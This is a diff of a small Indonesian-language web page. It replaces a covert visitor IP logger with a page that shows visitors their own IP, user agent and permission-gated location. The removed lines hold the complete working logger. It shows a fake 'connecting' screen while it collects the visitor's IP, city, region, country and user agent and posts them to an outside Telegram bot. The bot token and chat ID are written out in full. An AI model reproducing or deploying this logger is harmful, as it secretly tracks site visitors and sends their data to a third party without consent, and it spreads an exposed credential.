@@ -1,39 +1,69 @@
 
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>MIENTracker - IP Logger</title>
+  <title>Info Visitor Tracker</title>
+  <meta charset="UTF-8" />
   <style>
-    body { background-color: black; color: #0f0; font-family: monospace; text-align: center; padding-top: 100px; }
+    body {
+      background: black;
+      color: #00ff00;
+      font-family: monospace;
+      text-align: center;
+      padding: 30px;
+    }
+    .box {
+      border: 1px solid #00ff00;
+      padding: 20px;
+      margin: 20px auto;
+      width: 80%;
+      background-color: #111;
+    }
   </style>
 </head>
 <body>
-  <h1>🕵️‍♂️ Menghubungkan...</h1>
-  <p>Harap tunggu...</p>
+  <h1>🧠 Info Tracker Legal</h1>
+  <div class="box" id="info">
+    Mengambil info...
+  </div>
 
-<script>
-fetch("https://ipinfo.io/json?token=demo")
-  .then(res => res.json())
-  .then(data => {
-    const ip = data.ip;
-    const city = data.city;
-    const region = data.region;
-    const country = data.country;
-    const ua = navigator.userAgent;
+  <script>
+    async function getIP() {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip;
+    }
 
-    const pesan = "🌐 IP: " + ip + "\n📍 Lokasi: " + city + ", " + region + ", " + country + "\n🧠 User-Agent: " + ua;
+    async function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject("Geolocation not supported");
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(pos.coords),
+          err => reject("Tidak ada izin lokasi.")
+        );
+      });
+    }
 
-    fetch("https://api.telegram.org/bot8113101605:AAELCPTCdr4cEBe6opWXY7Rg5UEM969iPUM/sendMessage", {
-      method: "POST",
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: "7932600874",
-        text: pesan
-      })
-    });
-  })
-  .catch(() => console.log("Gagal ambil IP"));
-</script>
+    async function showInfo() {
+      const ip = await getIP();
+      const ua = navigator.userAgent;
+      let locText = "Lokasi tidak diizinkan.";
+
+      try {
+        const loc = await getLocation();
+        locText = `Latitude: ${loc.latitude}<br>Longitude: ${loc.longitude}<br>Akurasi: ${loc.accuracy} meter`;
+      } catch (e) {
+        locText = e;
+      }
+
+      document.getElementById("info").innerHTML = `
+        🌐 IP: ${ip}<br><br>
+        📱 User-Agent: ${ua}<br><br>
+        📍 Lokasi: <br>${locText}
+      `;
+    }
+
+    showInfo();
+  </script>
 </body>
 </html>
